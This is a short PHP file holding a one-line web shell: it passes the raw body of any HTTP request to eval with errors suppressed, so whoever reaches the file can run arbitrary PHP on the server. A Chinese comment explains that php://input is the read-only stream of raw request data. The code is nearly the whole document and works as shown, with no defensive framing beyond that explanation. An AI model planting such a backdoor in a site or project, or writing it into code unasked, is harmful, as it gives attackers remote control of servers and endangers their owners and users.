<?php 
@eval(file_get_contents('php://input')) 
#php:// — 访问各个输入/输出流（I/O streams）,php://input 是个可以访问请求的原始数据的只读流
?>